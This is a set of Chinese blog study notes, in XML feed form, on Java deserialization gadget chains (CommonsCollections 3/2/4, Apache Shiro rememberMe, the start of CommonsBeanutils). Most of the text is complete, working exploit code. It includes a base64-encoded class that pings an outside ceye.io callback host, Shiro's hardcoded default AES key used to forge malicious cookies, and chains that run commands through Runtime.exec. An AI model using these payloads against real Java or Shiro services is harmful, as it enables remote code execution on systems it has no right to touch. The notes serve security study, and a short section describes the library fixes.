class="keyword">public</span> <span class="class"><span class="keyword">class</span>  <span class="title">CC3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoAAgADBwAEDAAFAAYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgADgEAJHBpbmcgamF2YTE0LnVuc2VyaWF6by5oMnQ1a3kuY2V5ZS5pbwoACAAQDAARABIBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7BwAUAQAbYnl0ZWNvZGUvSGVsbG9UZW1wbGF0ZXNJbXBsAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB1MYnl0ZWNvZGUvSGVsbG9UZW1wbGF0ZXNJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAiAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACkBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAKU291cmNlRmlsZQEAF0hlbGxvVGVtcGxhdGVzSW1wbC5qYXZhACEAEwACAAAAAAADAAEAFQAWAAIAFwAAAD8AAAADAAAAAbEAAAACABgAAAAGAAEAAAAJABkAAAAgAAMAAAABABoAGwAAAAAAAQAcAB0AAQAAAAEAHgAfAAIAIAAAAAQAAQAhAAEAFQAjAAIAFwAAAEkAAAAEAAAAAbEAAAACABgAAAAGAAEAAAALABkAAAAqAAQAAAABABoAGwAAAAAAAQAcAB0AAQAAAAEAJAAlAAIAAAABACYAJwADACAAAAAEAAEAIQABAAUABgACABcAAABAAAIAAQAAAA4qtwABuAAHEg22AA9XsQAAAAIAGAAAAA4AAwAAAA0ABAAOAA0ADwAZAAAADAABAAAADgAaABsAAAAgAAAABAABACgAAQAqAAAAAgAr&quot;</span>);</span><br><span class="line">        TemplatesImpl obj =  <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        Common.setFieldValue(obj , <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;tset&quot;</span>);</span><br><span class="line">        Common.setFieldValue(obj , <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        Common.setFieldValue(obj , <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Transformer[] faketransformer = <span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(obj),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span> , <span class="keyword">null</span>, <span class="keyword">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span></span><br><span class="line">                ChainedTransformer(faketransformer);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;valueasdfsafs&quot;</span> ,<span class="string">&quot;xxxxjl&quot;</span>);</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) constructor.newInstance(Retention.class, proxymap);</span><br><span class="line"></span><br><span class="line">        Field field = transformerChain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="CC链结构"><a href="#CC链结构" class="headerlink" title="CC链结构"></a>CC链结构</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220316213458.png"></p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>CC3</tag>
      </tags>
  </entry>
  <entry>
    <title>java漫谈笔记-反序列化篇-Shiro</title>
    <url>/2022/03/17/java%E6%BC%AB%E8%B0%88%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-Shiro/</url>
    <content><![CDATA[<h1 id="java漫谈笔记-反序列化篇-Shiro"><a href="#java漫谈笔记-反序列化篇-Shiro" class="headerlink" title="java漫谈笔记-反序列化篇-Shiro"></a>java漫谈笔记-反序列化篇-Shiro</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>文章为phith0n<a href="https://govuln.com/">【代码审计】知识星球</a>中JAVA安全漫谈部分部分内容摘抄与阅读笔记。<br><a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a><br><a href="https://xz.aliyun.com/t/7950%E3%80%82">https://xz.aliyun.com/t/7950。</a></p>
<span id="more"></span>



<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>使用phith0n写的简单的<a href="https://github.com/phith0n/JavaThings">登录程序</a>shirodemo，使用mvn打包后放在Tomcat的webapps后可以正常访问。</p>
<h2 id="Shiro-rememberme"><a href="#Shiro-rememberme" class="headerlink" title="Shiro rememberme"></a>Shiro rememberme</h2><p>Shiro使用加密后的<code>Cookie</code>。rememberme来记录用户信息。其中cookie信息通过aes加密。 data-&gt;反序列化-&gt;aes-&gt;base64-&gt;cookie。但是在1.2.4及之前的版本aes加密的密钥是固定在代码中的。</p>
<p><code>org.apache.shiro.mgt</code>数据包中的<code>AbstractRememberMeManager</code>类中有aes的密钥。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220317153938.png">。<br>也就是说我们可以通过固定密钥构造恶意类，通过反序列化传递到服务端。<br>恶意类-&gt;序列化-&gt;aes-&gt;base64-&gt;服务端-&gt;base64-&gt;aes-&gt;反序列化-&gt;REC</p>
<p>我们先尝试使用CC6看看是否可以成功执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] payloads = <span class="keyword">new</span> CommonsCollections6().getPayload(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">    <span class="keyword">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">    System.out.printf(ciphertext.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将cookie发出后并没有弹出计算器,Tomcat爆出异常<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220317154717.png"></p>
<p><code>ClassResolvingObjectInputStream</code>类中无法加载类<code>[[Lorg.apache.commons.collections.Transformer;: static final long serialVersionUID = -4803604734341277543L;]</code></p>
<p>表示无法加载数组Transformer[]。 这里可以阅读<a href="https://blog.zsxsoft.com/post/35%E4%B8%8Ehttps://xz.aliyun.com/t/7950%E3%80%82">https://blog.zsxsoft.com/post/35与https://xz.aliyun.com/t/7950。</a></p>
<p>大概就是无法加载非原始类中的数组。之前无论是CC1, CC3,CC6都需要调用<code>transformerChain</code>的tranform方法。但是在这里无法使用数组成了一个问题。</p>
<p>可以使用JRMP解决，但是现在不会….</p>
<p>之前使用<code>TemplateImpl</code>改造CC6我们可以将transform数组减少到两个元素。这里注意<code>lazyMap</code>的get方法中的<code>key</code>。之前我们都不注意<code>key</code>的值。但是可以注意的第一次就是将<code>key</code>作为参数进行transform。所以到这里我们可以将数组中第一个元素constatnt(obj)作为key传入lazyMap的<code>key</code>。就可以将两个元素变为一个元素。</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220317160333.png"></p>
<p>使用这条链，我们可以成功弹出计算器。</p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>java漫谈笔记-Common-collections4</title>
    <url>/2022/03/18/java%E6%BC%AB%E8%B0%88%E7%AC%94%E8%AE%B0-Common-collections4/</url>
    <content><![CDATA[<h1 id="java漫谈笔记-CC4"><a href="#java漫谈笔记-CC4" class="headerlink" title="java漫谈笔记-CC4"></a>java漫谈笔记-CC4</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>文章为phith0n<a href="https://govuln.com/">【代码审计】知识星球</a>中JAVA安全漫谈部分部分内容摘抄与阅读笔记。</p>
<h2 id="commons-collections4"><a href="#commons-collections4" class="headerlink" title="commons.collections4"></a>commons.collections4</h2><p>在反序列化漏洞爆出时，apahce拥有两个common.collections版本。两个版本并不兼容，是两个并行的版本。在maven中 groupid 和 aritifactId也不相同。<br>在collections4中之前的CC1 CC6 都可以使用。同时在commons-collections4中有一条新的gadget使用<code>priorityQueue</code>。ysoseiral中对于这条链有两个变种<code>CC2</code> 和 <code>CC4</code>。</p>
<span id="more"></span>


<h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>使用的关键类是<code>java.util.PriorityQueue</code>。<code>priorityQueue</code>的<code>readObject</code>方法中使用<code>heapify()</code>方法<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220318155810.png"><br><code>heapify</code>继续调用<code>siftDownUsingComparator()</code>方法.<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220318155852.png"><br><code>siftDownUsingComparator</code>中使用类 <code>Comparator</code>类的<code>compare</code>方法。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220318160326.png"><br>同时使用<code>TransformingComparator</code>类。它继承了<code>Comparator</code>接口。它的<code>compare</code>方法使用了<code>transform</code>方法。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220318160518.png"><br>总结下来调用链条为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">priorityQueue:readObject()</span><br><span class="line">	heapify()</span><br><span class="line">		siftDownUsingComparator()</span><br><span class="line">			TransformingComparator.compare(obj1, obj2)</span><br><span class="line">				obj1.transform()</span><br><span class="line">				</span><br></pre></td></tr></table></figure>

<p><code>PriorityQueeu</code>使用丁堆来做到有限队列，所以在还原队列的过程中需要还原原来的顺序。这就需要元素之间的比较。这个时候就可以调用我们自己编写的恶意比较方法。调用<code>transform</code>方法。</p>
<p>接着我们实现POC</p>
<p>先实现一个<code>ChainTransformer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer faketransform = <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>);</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125; , <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125; , <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125; ),</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerchain = <span class="keyword">new</span> ChainedTransformer(faketransform);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>接着我们用这个<code>ChainTransformer</code>构造一个<code>Comparator</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TransformingComparator cmp = <span class="keyword">new</span> TransformingComparator(transformerchain);</span><br></pre></td></tr></table></figure>

<p>使用构造<code>Comparator</code>构造一个<code>PriorityQueue</code>同时往里面加入两个元素。至少需要两个元素才会实现比较</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">x.add(<span class="number">1</span>);</span><br><span class="line">x.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>最后将恶意<code>Transformer</code>换入<code>ChainTranformer</code>得到完整poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Common.setFieldValue(transformerchain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br></pre></td></tr></table></figure>

<p>完整的代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> common.Common;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer faketransform = <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125; , <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125; , <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125; ),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerchain = <span class="keyword">new</span> ChainedTransformer(faketransform);</span><br><span class="line">        TransformingComparator cmp = <span class="keyword">new</span> TransformingComparator(transformerchain);</span><br><span class="line">        PriorityQueue x = <span class="keyword">new</span> PriorityQueue(cmp);</span><br><span class="line">        x.add(<span class="number">1</span>);</span><br><span class="line">        x.add(<span class="number">2</span>);</span><br><span class="line">        Common.setFieldValue(transformerchain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(x);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>我们可以使用之前在Shiro中提到的无数组使用字节码构造相似的POC</p>
<p>获得字节码，并设置<code>TemplatesImpl</code>的对应属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        TemplatesImpl templates  = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line"><span class="comment">//        System.out.println(evil.Evil.class.getName());</span></span><br><span class="line">        CtClass clazz = classPool.get(evil.Evil.class.getName());</span><br><span class="line">        <span class="keyword">byte</span>[] code = clazz.toBytecode();</span><br><span class="line">        Common.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125; );</span><br><span class="line">        Common.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        Common.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br></pre></td></tr></table></figure>

<p>设置<code>InvokeTransformer</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>)&#125;;</span><br></pre></td></tr></table></figure>

<p><code>PriorityQueue</code>添加<code>Templates</code>元素，和<code>Shiro</code>相识队列中的元素作为cmp(obj)传入，省略了数组中第一个<code>ConstantTransformer</code></p>
<p>完整POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cc6.CC6;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> common.Common;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer faketransform = <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>);</span><br><span class="line">        TemplatesImpl templates  = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line"><span class="comment">//        System.out.println(evil.Evil.class.getName());</span></span><br><span class="line">        CtClass clazz = classPool.get(evil.Evil.class.getName());</span><br><span class="line">        <span class="keyword">byte</span>[] code = clazz.toBytecode();</span><br><span class="line">        Common.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125; );</span><br><span class="line">        Common.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        Common.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>)&#125;;</span><br><span class="line">        Transformer transformerchain = <span class="keyword">new</span> ChainedTransformer(faketransform);</span><br><span class="line">        TransformingComparator cmp = <span class="keyword">new</span> TransformingComparator(transformerchain);</span><br><span class="line">        PriorityQueue x = <span class="keyword">new</span> PriorityQueue(cmp);</span><br><span class="line">        x.add(templates);</span><br><span class="line">        x.add(templates);</span><br><span class="line">        Common.setFieldValue(transformerchain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(x);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line"></span><br><span class="line">            ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="反序列化修复"><a href="#反序列化修复" class="headerlink" title="反序列化修复"></a>反序列化修复</h2><p>在<code>common-collections3</code>中是无法使用<code>CC2</code>和<code>CC4</code>链条的。因为在<code>common-collections3</code>中<code>TransformerComparator</code>没有实现<code>Serilizable</code>接口。</p>
<p>同时apache在得知反序列化漏洞后发布了新版本3.2.2和4.1</p>
<p>先看3.2.2，通过diff可以发现，新版代码中增加了⼀个⽅法<br>FunctorUtils#checkUnsafeSerialization ，⽤于检测反序列化是否安全。如果开发者没有设置全<br>局配置 org.apache.commons.collections.enableUnsafeSerialization=true ，即默认情况下会<br>抛出异常。<br>这个检查在常⻅的危险Transformer类<br>（ InstantiateTransformer 、 InvokerTransformer 、 PrototypeFactory 、 CloneTransforme<br>r 等）的 readObject ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出⼀个异常：</p>
<p>在4.1中 这⼏个危险Transformer类不再实现 Serializable 接⼝</p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>CC2</tag>
        <tag>CC4</tag>
      </tags>
  </entry>
  <entry>
    <title>java漫谈笔记-CB和无CCShiro</title>
    <url>/2022/03/19/java%E6%BC%AB%E8%B0%88%E7%AC%94%E8%AE%B0-CB%E5%92%8C%E6%97%A0CCShiro/</url>
    <content><![CDATA[<h1 id="java漫谈笔记-CB1和无CC链Shiro"><a href="#java漫谈笔记-CB1和无CC链Shiro" class="headerlink" title="java漫谈笔记-CB1和无CC链Shiro"></a>java漫谈笔记-CB1和无CC链Shiro</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>文章为phith0n<a href="https://govuln.com/">【代码审计】知识星球</a>中JAVA安全漫谈部分部分内容摘抄与阅读笔记。</p>
<h2 id="Apache-commons-beanutils"><a href="#Apache-commons-beanutils" class="headerlink" title="Apache commons-beanutils"></a>Apache commons-beanutils</h2><p><code>Apache commons-beanutils</code>是一个类，它可以通过静态方法<code>PropertyUtils.getProperty</code>调用类中以<code>get</code>为开头的方法。<span id="more"></span>比如以下<code>Test</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>cb1.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cb1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> evil.Test;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CB1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        Test x  = <span class="keyword">new</span> Test();</span><br><span class="line">        x.setName(<span class="string">&quot;1234&quot;</span>);</span><br><span class="line">        String a = <span class="keyword">null</span>;</span><br><span 